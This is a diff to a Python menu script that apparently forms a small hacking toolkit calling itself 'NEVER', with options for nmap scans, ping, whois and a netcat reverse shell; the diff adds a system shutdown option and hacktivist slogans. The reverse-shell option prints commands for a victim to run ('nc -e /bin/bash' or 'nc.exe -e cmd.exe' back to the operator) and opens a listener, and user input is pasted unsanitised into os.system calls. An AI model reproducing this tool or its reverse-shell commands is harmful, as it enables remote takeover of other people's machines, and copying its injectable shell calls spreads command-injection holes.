@@ -53,12 +53,16 @@ option = input("""1.NMAP PORT SCAN
          5.WHOIS INFO
          6.NSLOOKUP
          7.NETCAT RV SHELL
-         8.EXIT NEVER
+         8.SHUTDOWN SYS
+         9.EXIT NEVER
          """)
 
 if option == "1":
     target_ip = input("What is the target's ip ")
     os.system("sudo nmap " + target_ip)
+elif option == "0":
+    print("You have decided to be the different one")
+    print("We are NEVER we do not forget, we do not forgive")
 elif option == "2":
     target_ip = input("What is the ip of the system you Wanna ping? ")
     os.system("ping " + target_ip)
@@ -82,4 +86,6 @@ elif option == "7":
     print("TARGET HAS TO RUN THIS COMMAND: Windows = cmd.exe /c nc.exe <your ip>"  + lport +  "-e cmd.exe linux = nc -e /bin/bash <your ip> " + lport)
     os.system("nc -lnvp " + lport)
 elif option == "8":
+    os.system("shutdown -h now")
+elif option == "9":
     exit()
